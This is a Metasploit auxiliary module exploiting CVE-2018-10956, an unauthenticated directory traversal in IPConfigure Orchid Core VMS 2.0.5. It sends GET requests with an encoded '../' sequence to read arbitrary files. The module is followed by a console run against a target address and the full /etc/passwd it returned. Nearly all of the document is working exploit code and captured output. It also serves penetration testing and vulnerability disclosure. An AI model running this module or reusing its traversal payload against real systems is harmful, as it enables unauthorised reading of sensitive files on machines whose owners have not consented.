require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IPConfigure Orchid VMS <=2.0.5 Directory Traversal Information Disclosure',
			'Description'    => %q{
				Orchid Core VMS is vulnerable to a directory traversal attack. This affects Linux and Windows operating systems. This allows a remote, unauthenticated attacker to send crafted GET requests to the application, which results in the ability to read arbitrary files outside of the applications web directory. This issue is further compounded as the Linux version of Orchid Core VMS application is running in context of a user in the sudoers group. As such, any file on the underlying system, for which the location is known, can be read.

				This module was tested against 2.0.5. This has been fixed in 2.0.6.
			},
			'Author'         => [ 'Sanjiv Kawa @kawabungah' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2018-10956' ],
					[ 'URL', 'https://labs.nettitude.com/blog/cve-2018-10956-unauthenticated-privileged-directory-traversal-in-ipconfigure-orchid-core-vms/' ],
					[ 'URL', 'http://ipconfigure.com/products/orchid-archives' ]
				],
			'DisclosureDate' => 'May 7, 2018'))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The base path to Orchid VMS', '/']),
				OptString.new('FILE', [ true, 'This is the file to download', '/etc/passwd']),
				OptString.new('INPUTFILE', [ false, 'Specify a list of files to download']),
				Opt::RPORT(80)
			], self.class )
	end

	def init_request(path)
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => path
			})

		return res
	end

	def run
		path = normalize_uri(target_uri.path)
		res = init_request(path)

		if res && res.code == 200
			file = Array.new
			trigger = "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F"


			if datastore['INPUTFILE'].nil? || datastore['INPUTFILE'].empty?
     			file = [datastore['FILE']]
    		else
      			file = File.open([datastore['INPUTFILE']].join(', ').to_s).readlines
    		end

    		for i in 0 .. file.length - 1
	    		path = normalize_uri(target_uri.path) + trigger + file[i]
	    		res = init_request(path)

	    		if res.code == 200
	    			print_good("Obtained #{datastore['FILE']}")
	    			puts res.body
	    			puts ""
	    		else
	    			print_error("#{datastore['FILE']} does not exist")
	    			puts res.body
	    			puts ""
	    		end
			end
		else
			print_error("Web Server is Unresponsive")
		end
	end
end
__END__
msf auxiliary(scanner/http/orchid_core_vms_directory_traversal) > show options

Module options (auxiliary/scanner/http/orchid_core_vms_directory_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILE       /etc/passwd      yes       This is the file to download
   INPUTFILE                   no        Specify a list of files to downloads
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.100.100.100  yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Orchid VMS
   VHOST                       no        HTTP server virtual host

msf auxiliary(scanner/http/orchid_core_vms_directory_traversal) > run

[+] Obtained /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash